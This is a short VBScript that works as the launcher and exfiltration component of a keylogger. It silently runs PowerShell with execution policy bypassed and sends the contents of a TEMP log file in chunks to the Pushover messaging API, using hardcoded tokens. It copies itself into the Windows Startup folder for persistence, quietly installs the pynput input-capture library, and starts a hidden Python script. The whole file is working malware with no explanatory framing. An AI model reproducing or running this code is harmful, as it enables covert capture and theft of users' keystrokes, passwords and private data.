Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define PowerShell script
psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
    """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _
    "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
    "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
    "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
    "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _
    "while ($MESSAGE.Length -gt 0) { " & _
    "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
    "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
    "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
    "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""

' Run the PowerShell command (silent mode)
objShell.Run "cmd /c " & psCommand, 0, True

' Get the path to the Startup folder
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"

' Get the path to the current script
currentScript = WScript.ScriptFullName

' Copy the script to the Startup folder
objFSO.CopyFile currentScript, startupPath & "b.vbs", True

' Install pynput in the background
objShell.Run "cmd /c ""pip install pynput""", 0, True

' Define the path to the Python script in the %TEMP% directory
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
pythonScript = tempPath & "\a.py"

' Check if the Python script exists before running
If objFSO.FileExists(pythonScript) Then
    objShell.Run "cmd /c ""pythonw """ & pythonScript & """", 0, False
Else
    objShell.Popup "Error: a.py not found in TEMP folder", 5, "Script Error", 16
End If
